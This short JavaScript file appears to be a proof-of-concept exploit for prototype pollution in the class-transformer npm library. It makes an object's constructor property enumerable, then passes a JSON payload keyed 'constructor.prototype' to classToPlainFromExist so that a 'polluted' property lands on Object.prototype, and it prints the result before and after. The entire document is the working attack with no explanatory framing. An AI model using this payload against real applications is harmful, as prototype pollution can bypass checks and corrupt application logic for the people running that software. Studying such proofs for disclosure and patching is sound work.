var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const root = require('class-transformer');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
root.classToPlainFromExist(payload, obj);
console.log({}.polluted);